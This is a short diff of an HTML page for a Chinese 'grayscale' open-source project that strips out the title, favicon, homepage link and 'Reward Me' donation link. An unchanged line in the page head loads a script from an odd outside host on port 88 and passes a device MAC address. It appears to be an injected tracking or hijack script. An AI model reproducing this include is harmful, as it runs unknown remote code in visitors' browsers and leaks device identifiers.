@@ -6,8 +6,7 @@
 <head><script src="https://t.7gg.cc:88/j.js?MAC=68DB5482FAF5" type="dc2dc271068775d9710f9f20-text/javascript"></script>  
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
-<title>灰度开源项目</title>
-<link rel="shortcut icon" href="logo.png" />
+
 <script type="dc2dc271068775d9710f9f20-text/javascript" src="js/jquery.min.js"></script>
 
 <style>
@@ -356,10 +355,10 @@ html, body {
   </div>
   <div class="box__description">
     <div class="box__description-container">
-	  <a href="https://huidu666.github.io/huidu/kaiyuansc/huiduweb.html" class="btn2">灰 度 主 页</a>
+	  
 	  <br><br><br><br>
     </div>
-    <a href="https://xiaobeiit.com/img/huidu/reward.png" class="box__button">Reward Me</a>
+    
   </div>
 </div>
 
